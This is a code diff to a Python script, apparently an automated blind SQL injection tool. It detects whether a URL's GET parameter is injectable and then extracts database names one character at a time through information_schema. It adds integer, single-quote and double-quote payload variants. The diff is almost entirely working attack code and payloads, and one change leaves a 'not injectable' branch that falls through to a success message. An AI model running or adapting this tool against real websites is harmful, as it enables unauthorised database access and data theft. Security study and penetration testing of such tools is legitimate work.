@@ -104,7 +104,7 @@ def first_sql_injection(url, get_param, cookies, injection_type) -> int:
     return 0
 
 
-def identify_vulnerability(url, get_param, cookies={'':''}) -> int:
+def identify_vulnerability(url, get_param, cookies={'':''}) -> str:
     '''
     Identify the SQL Injection in the given URL, using the given GET parameter and the given cookies, if needed.
     
@@ -132,10 +132,8 @@ def identify_vulnerability(url, get_param, cookies={'':''}) -> int:
     
     if injectable == '':
         print(Fore.RED + f"Your GET parameter `{get_param}` is not injectable, sorry.")
-        return 1
-    
     print(Fore.GREEN + f"Your GET parameter `{get_param}` is injectable through {injectable}!")
-    return 0
+    return injectable
 
 
 def iterative_request(url, get_param, cookies, payload, is_char=False) -> int|str:
@@ -176,7 +174,7 @@ def iterative_request(url, get_param, cookies, payload, is_char=False) -> int|st
     return result_value
 
 
-def identify_db(url, get_param, cookies):
+def identify_db(url, get_param, cookies, injectable):
     '''
     Identify the number and names of the databases.
     
@@ -187,24 +185,40 @@ def identify_db(url, get_param, cookies):
     '''
     print(Fore.CYAN + 'Identifying databases ...')
     time.sleep(0.75)
+
+    payload_db = ''
+    payload_length = ''
+    payload_name = ''
+    _injectable = injectable.replace(' ', '_')
+
+    if _injectable == 'integers':
+        payload_db = "1 and (select count(schema_name) from information_schema.schemata)=iterate -- -"
+        payload_length = "1 and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
+        payload_name = "1 and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
+    elif _injectable == 'simple_quotes':
+        payload_db = "1' and (select count(schema_name) from information_schema.schemata)=iterate -- -"
+        payload_length = "1' and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
+        payload_name = "1' and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
+    elif _injectable == 'double_quotes':
+        payload_db = "1\" and (select count(schema_name) from information_schema.schemata)=iterate -- -"
+        payload_length = "1\" and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
+        payload_name = "1\" and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
     
-    payload = "1' and (select count(schema_name) from information_schema.schemata)=iterate -- -"
-    n_database = iterative_request(url, get_param, cookies, payload)
+    n_database = iterative_request(url, get_param, cookies, payload_db)
     print(Fore.LIGHTGREEN_EX + f"The number of databases is {n_database}")
 
     for i in range(n_database):
         print(Fore.LIGHTCYAN_EX + f"\t>>> Database {i+1} ...")
+        time.sleep(0.75)
         if (i == 0):
             print(Fore.YELLOW + '\tSkipping INFORMATION_SCHEMA ...')
             continue
-        payload = "1' and (select length(schema_name) from information_schema.schemata limit {},1)=iterate -- -".format(i)
-        length_db = iterative_request(url, get_param, cookies, payload)
+        length_db = iterative_request(url, get_param, cookies, payload_length.format(i=i))
         print(Fore.LIGHTCYAN_EX + f"\t>>>>> LENGTH: {length_db}")
         
         db_name = ''
         for n_char in range(length_db):
-            payload = "1' and substring((select schema_name from information_schema.schemata limit {},1),{},1)=iterate -- -".format(i, n_char+1)
-            db_name += iterative_request(url, get_param, cookies, payload, is_char=True)
+            db_name += iterative_request(url, get_param, cookies, payload_name.format(i=i, n_char=n_char+1), is_char=True)
         print(Fore.LIGHTCYAN_EX + f"\t>>>>> NAME: {db_name}")
         
 
@@ -223,15 +237,15 @@ def main() -> int:
         print(Fore.GREEN + "Site reached!  Let's continue with the adventure ...\n")
 
         '''Identify and extract vulnerabilities.'''
-        code = identify_vulnerability(args.url, args.get_param, args.cookies)
-        if code == 1:
+        injectable = identify_vulnerability(args.url, args.get_param, args.cookies)
+        if injectable == '':
             print(Fore.RED + f"Sorry, the URL you provided is not injectable through the GET parameter `{args.get_param}`")
             return 1
         print(Fore.GREEN + f"Your URL is vulnerable to SQL Injection!\n")
         
         '''Extract information from the database (default behaviour).'''
         # TODO: depending on the input of the user, by default extract databases of the site
-        identify_db(args.url, args.get_param, args.cookies)
+        identify_db(args.url, args.get_param, args.cookies, injectable)
 
         print(Fore.GREEN + '\nDatabase recognition finished!!')
     except Exception as err:
